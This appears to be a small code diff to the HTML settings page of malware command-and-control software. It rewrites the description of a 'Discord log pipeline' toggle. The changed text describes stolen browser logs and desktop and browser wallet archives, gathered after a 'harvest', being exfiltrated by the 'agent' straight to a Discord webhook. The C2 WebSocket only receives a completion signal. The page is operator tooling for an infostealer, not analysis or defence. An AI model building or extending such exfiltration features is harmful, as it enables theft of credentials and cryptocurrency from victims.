@@ -147,7 +147,7 @@
           <div class="setting-row">
             <div class="setting-info">
               <span class="setting-name">Discord log pipeline</span>
-              <span class="setting-desc">When on: after harvest finishes, upload log zips then wallet zips (browser + desktop) to the <strong>same</strong> Discord forum post (≤~7.5 MiB parts). Server imports that post for display.</span>
+              <span class="setting-desc">When on: the <strong>agent</strong> POSTs log+wallet zips straight to the Discord webhook (HTTP). C2 WebSocket only gets a tiny “done” signal; the server then imports that forum post (needs bot token + channel id).</span>
             </div>
             <label class="toggle-label">
               <input type="checkbox" id="discord-upload-toggle" />
